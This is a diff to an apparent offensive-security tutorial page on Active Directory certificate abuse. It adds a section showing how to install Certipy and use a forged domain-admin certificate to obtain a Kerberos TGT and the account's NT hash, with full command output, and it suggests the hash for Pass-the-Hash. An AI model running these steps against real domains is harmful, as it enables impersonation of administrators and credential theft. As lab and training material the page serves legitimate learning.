@@ -140,7 +140,32 @@ $ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01P
 [*] Saving certificate in johnDomainAdmin@offsec.nl.pfx (password: admin)
 ```
 
-### Requesting TGT for alternative user
+### Getting NTLM hash for alternative user
+
+1. `git clone https://github.com/ly4k/Certipy`
+2. `cd Certipy`
+3. `python3 -m venv certipy-venv`
+4. `source certipy-venv/bin/activate`
+5. `pip install certipy-ad`
+
+```plain
+$ certipy auth -pfx ../certi/john-da@offsec.nl.pfx -password admin -username 'john-da' -domain 'offsec.nl' -dc-ip 10.10.10.10
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'john-da@offsec.nl'
+[*] Using principal: 'john-da@offsec.nl'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'john-da.ccache'
+[*] Wrote credential cache to 'john-da.ccache'
+[*] Trying to retrieve NT hash for 'john-da'
+[*] Got hash for 'john-da@offsec.nl': aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07
+```
+
+You can now use the hash (`5f859684db2422704e9e4c2cd7e27b07`) for Pass-the-Hash.
+
+### Requesting TGT for alternative user via Windows
 
 {{%resources fa_icon_class="far fa-file" pattern=".*(exe)"/%}}
 
